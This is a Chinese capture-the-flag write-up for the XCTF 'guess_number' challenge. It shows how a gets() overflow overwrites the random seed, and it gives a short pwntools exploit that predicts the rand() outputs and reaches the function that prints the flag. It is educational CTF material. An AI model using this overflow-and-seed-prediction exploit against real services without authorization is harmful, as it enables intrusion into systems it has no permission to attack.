

# XCTF攻防世界guess_number

## guess\_number题解

首先进行程序基本信息检查：

![](https://bbs.kanxue.com/upload/attach/201910/779730_ZGBHUBAFPSRE25Z.png)

看起来是正常程序，大概就是输入一个`name`，然后输入一个数字，相匹配就成功。（初步猜测是随机数233333）

`ida`查看一下源代码：

![](https://bbs.kanxue.com/upload/attach/201910/779730_4AYEZYEKVUNUKPH.png)

很幸运，程序没有进行混淆或者反调，直接看到了真实的源代码。在`main`函数里，我们注意到有一个`gets()`函数，这是一个危险函数，很可能会出问题。

继续往下看，下面的`for`循环是处理输入的数字部分，果然是一个随机数字，猜对了。在这里，有一个`if`判断，我们是否可以进行覆盖使判断条件成立直接执行到`success`？不能，因为程序开启了`cannary`，没办法进行覆盖。

最后在输入正确的数字后会执行一个`sub_C3E()`函数，进入函数查看：

![](https://bbs.kanxue.com/upload/attach/201910/779730_EHZ3WBMQGM9FBCS.png)

直接执行了`"cat flag"`。

总结一下，我们就是要输入正确的随机数，然后让程序执行到`sub_C3E()`函数，就可以看到`flag`了。那么如何猜对随机数字呢？

需要注意在产生随机数的前面有个`gets()`函数，而且没有对输入的字符长度进行限制。来看一下栈中的情况：

![](https://bbs.kanxue.com/upload/attach/201910/779730_38F5B33S8JS25JB.png)

我们可以通过`var_30`对`seed`进行覆盖，这样一来生成的随机数就变成我们已知的了。

具体实现：

1. 通过垃圾字符覆盖`var_30`到`seed`：`"a" * 0x20`
2. 使用`p64()`把`1`按照64位的方式进行排列产生随机数
3. 调用`srand()`生成随机数
4. 利用循环多次输入进行比较，直到相等。

`exp`：

```python
from pwn import *
from ctypes import *

sh = remote('111.198.29.45',43114)
e=ELF('./guess_number')
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

payload = 'A' * 0x20 + p64(1)

sh.sendlineafter("name:",payload)

libc.srand(1)
for i in range(10):
    sh.sendlineafter("number:",str(libc.rand()%6+1))

print sh.recvall()
```

最终获取到`flag`：

![](https://bbs.kanxue.com/upload/attach/201910/779730_VEUJ59Y8HBUQTV9.png)

### 知识点：`ctypes`的利用，详解见官网吧～～

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

